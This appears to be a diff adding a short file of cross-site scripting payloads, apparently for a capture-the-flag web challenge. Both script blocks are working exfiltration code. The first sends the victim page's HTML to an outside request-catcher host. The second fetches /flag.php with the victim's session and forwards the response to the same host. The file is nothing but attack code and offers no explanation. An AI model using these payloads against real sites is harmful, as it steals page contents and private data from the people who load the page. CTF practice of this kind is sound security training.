@@ -1,0 +1,20 @@
+//to get hint
+<Script>var x=new XMLHttpRequest();
+x.open("GET","https://hidehidehide.free.beeceptor.com?" + document.body.innerHTML);
+x.send();
+</Script> 
+
+
+
+//to get flag
+<Script>var x=new XMLHttpRequest();
+x.open("GET","/flag.php",true);
+x.send();
+x.onreadystatechange = function() { 
+    if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
+        res = x.responseText;
+        var xhttp=new XMLHttpRequest();
+        xhttp.open("GET","https://hidehidehide.free.beeceptor.com/?" + res);
+        xhttp.send();}
+}
+</Script>
